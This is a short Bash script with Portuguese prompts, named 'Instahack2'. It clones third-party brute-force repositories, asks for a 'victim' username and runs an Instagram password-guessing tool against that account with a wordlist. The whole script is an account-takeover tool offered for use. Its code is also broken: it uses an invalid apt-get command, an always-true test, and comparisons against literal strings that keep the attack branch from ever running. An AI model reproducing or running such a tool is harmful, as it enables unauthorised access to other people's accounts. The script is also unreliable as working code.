#!/bin/bash
#
#Atualizando pacotes de instalação
apt-get update
apt-get upgrade
apt-get git
#
if [ "cl" ];then
find Brute-Force; find Instagram
        echo "Diretório encontrado"
clear
else
clear
        figlet "Diretorio nao encontrado"
git clone https://github.com/MRX8001/Brute-Force
git clone https://github.com/Pure-L0G1C/Instagram
fi
clear
figlet Instahack2
echo "====================================================="
echo "= [1]=> Invadir uma conta				  ="
echo "= [2]=> Sair				          ="
echo "====================================================="
read -p "[+]=>" instahack
#
#
if [ "instahack" = "1" ];then
clear
echo
 echo "[+]=>DIGITE O NOME DA VÍTIMA"
#
read -p "[+]=>" hack
#
fi
if [ "hack" = "1" ];then
#Start
cd Instagram
pip2 install -r requirements.txt
python2 intagram.py $hack /home/default00/instahack2/Brute-Force/wordlist/wordlist.txt -m 3
fi
